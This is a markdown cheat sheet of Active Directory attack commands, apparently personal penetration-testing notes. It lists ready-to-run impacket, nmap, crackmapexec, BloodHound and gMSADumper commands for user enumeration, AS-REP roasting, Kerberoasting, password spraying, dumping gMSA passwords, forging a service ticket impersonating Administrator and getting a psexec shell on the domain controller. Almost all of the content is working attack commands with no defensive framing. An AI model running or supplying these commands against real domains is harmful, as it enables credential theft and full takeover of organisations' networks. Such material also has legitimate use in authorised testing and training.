# example attack

1. check smb if some generic user is allowed to access
2. check sids for user list: impacket-lookupsid generic@$rhost
3. AS_REP: impacket-GetNPUsers '$DOMAIN/' -usersfile users.txt -no-pass -dc-ip $rhost -outfile asrep.hash
4. crack hash
5. Kerberoasting (requires credentials) (can output hashes for new users): impacket-GetUserSPNs 'full.domain/some_user:some_password' -outputfile keberoast.hash -dc-ip $rhost
6. crack hash

# linux attacker

## enumerate LDAP

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 $rhost
```

## enumerate users with kerberos

```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<some.domain>',userdb=/usr/share/seclists/Usernames/cirt-default-usernames.txt $rhost
```

## enumerate with AS_REP message

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <some.domain>/ -usersfile /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -format hashcat -outputfile hashes.asreproast
```

## bruteforce ldap

```bash
crackmapexec ldap $rhost -u users.txt --kdcHost $rhost -p 'some.password'
```

## gather information for bloodhound (with valid creds)

```bash
bloodhound-python -u 'user_name' -p 'user_password' -dc "dc.domain.tld" -d "domain.tld" -ns "$rhost" -c ALL
```

# Permissions/Groups

## ReadGMSAPassword

GMSAPassword allows users to read Passwords from other users.
This can be used to get the kerberos hashes/tickets.

```bash
python3 gMSADumper.py -u user_name -p user_password -d domain.tld
```
# Kerberos

## get time 

```bash
sudo ntpdate -q "$rhost"
```

## Update clock

Kerberos is pretty much dependend on accurate time for server and clint so be sure to update the clock:

```bash
sudo ntpdate "$rhost"
```

## Or via faketime

```bash
export FAKETIME="2020-01-01 12:12:12"
export FAKETIME="+8h"
export LD_PRELOAD=/usr/local/lib/faketime/libfaketime.so.1
```

## Generate Silber Ticket from hash

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.domain.tld -impersonate Administrator domain.tld/user$ -hashes some_hash:some_hash
impacket-getST -spn WWW/dc.domain.tld -impersonate Administrator domain.tld/user$ -hashes some_hash:some_hash
```

### Use ticket (impacket-psexec)

```bash
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass -dc-ip "$rhost" -target-ip "$rhost" domain.tld/Administrator@dc.domain.tld
kRB5CCNAME=Administrator.ccache python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip "$rhost" -target-ip "$rhost" domain.tld/Administrator@dc.domain.tld
```
